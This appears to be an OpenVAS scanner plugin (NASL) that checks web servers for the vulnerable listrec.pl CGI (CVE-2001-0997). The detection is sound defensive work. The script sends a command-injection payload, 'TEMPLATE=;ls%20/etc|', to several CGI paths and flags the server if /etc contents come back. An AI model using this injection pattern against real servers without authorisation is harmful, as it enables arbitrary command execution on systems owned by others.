# OpenVAS Vulnerability Test
# $Id: listrec.nasl 17 2013-10-27 14:01:43Z jan $
# Description: Checks for listrec.pl
#
# Authors:
# Matt Moore <matt@westpoint.ltd.uk> 
#
# Copyright:
# Copyright (C) 2001 Matt Moore
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "The 'listrec.pl' cgi is installed. This CGI has
a security flaw that lets an attacker execute arbitrary
commands on the remote server, usually with the privileges of the web server.";

tag_solution = "Remove it from /cgi-bin/common/.";

if(description)
{
 script_id(10769);
 script_version("$Revision: 17 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_tag(name:"risk_factor", value:"High");
 script_cve_id("CVE-2001-0997");
 
 name = "Checks for listrec.pl";
 script_name(name);
 
 desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;




 script_description(desc);
 
 summary = "Checks for the listrec.pl CGI";
 
 script_summary(summary);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright("This script is Copyright (C) 2001 Matt Moore");

 family = "Web application abuses";

 script_family(family);

 script_dependencies("find_service.nasl", "no404.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

#
# The script code starts here
#


include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);


if(!get_port_state(port))exit(0);


dir[0] = "/cgi-bin/common";
dir[1] = "/cgi-local";
dir[2] = "/cgi_bin";
dir[3] = "";

 for(i=0; dir[i]; i = i + 1)
 {
 item = string(dir[i], "/listrec.pl?APP=qmh-news&TEMPLATE=;ls%20/etc|");
 req = http_get(item:item, port:port);
 res = http_keepalive_send_recv(port:port, data:req);
 if( res == NULL ) exit(0);
 if("resolv.conf" >< res) {
  	 security_hole(port);
	 exit(0);
	}  
 }
 

foreach dir (cgi_dirs())
{
 item = string(dir, "/listrec.pl?APP=qmh-news&TEMPLATE=;ls%20/etc|");
 req = http_get(item:item, port:port);
 res =  http_keepalive_send_recv(port:port, data:req);
 if( res == NULL ) exit(0);
 if("resolv.conf" >< res)security_hole(port);
}

